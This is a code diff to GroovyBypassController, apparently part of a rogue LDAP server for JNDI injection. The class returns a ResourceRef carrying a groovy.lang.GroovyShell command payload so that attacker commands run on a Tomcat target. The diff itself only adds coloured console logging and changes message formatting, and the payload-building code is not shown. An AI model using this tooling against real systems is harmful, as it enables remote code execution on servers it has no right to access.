@@ -11,6 +11,8 @@ import com.unboundid.ldap.sdk.ResultCode;
 import org.apache.naming.ResourceRef;
 import javax.naming.StringRefAddr;
 
+import static org.fusesource.jansi.Ansi.ansi;
+
 /*
  * Requires:
  *   - Tomcat and Groovy in classpath
@@ -35,7 +37,7 @@ public class GroovyBypassController implements LdapController {
 
     @Override
     public void sendResult(InMemoryInterceptedSearchResult result, String base) throws Exception {
-        System.out.println("[+] Sending LDAP ResourceRef result for " + base + " with groovy.lang.GroovyShell payload");
+        System.out.println( ansi().render("@|green [+]|@ @|MAGENTA Sending LDAP ResourceRef result for |@" + base + " @|MAGENTA with groovy.lang.GroovyShell payload|@"));
 
         Entry e = new Entry(base);
         e.addAttribute("javaClassName", "java.lang.String"); //could be any
@@ -62,18 +64,18 @@ public class GroovyBypassController implements LdapController {
             String payloadType = base.substring(firstIndex + 1, secondIndex);
             if(payloadType.equalsIgnoreCase("command")){
                 type = PayloadType.valueOf("command");
-                System.out.println("[+] Paylaod: " + type);
+                System.out.println( ansi().render("@|green [+]|@ @|MAGENTA Paylaod >> |@" + type));
             }else{
-                throw new UnSupportedPayloadTypeException("UnSupportedPayloadType: " + payloadType);
+                throw new UnSupportedPayloadTypeException("UnSupportedPayloadType >> " + payloadType);
             }
 
             String cmd = Util.getCmdFromBase(base);
-            System.out.println("[+] Command: " + cmd);
+            System.out.println( ansi().render("@|green [+]|@ @|MAGENTA Command >> |@" + cmd));
             params = new String[]{cmd};
         }catch(Exception e){
             if(e instanceof UnSupportedPayloadTypeException) throw (UnSupportedPayloadTypeException)e;
 
-            throw new IncorrectParamsException("Incorrect params: " + base);
+            throw new IncorrectParamsException("Incorrect params >> " + base);
         }
     }
 }
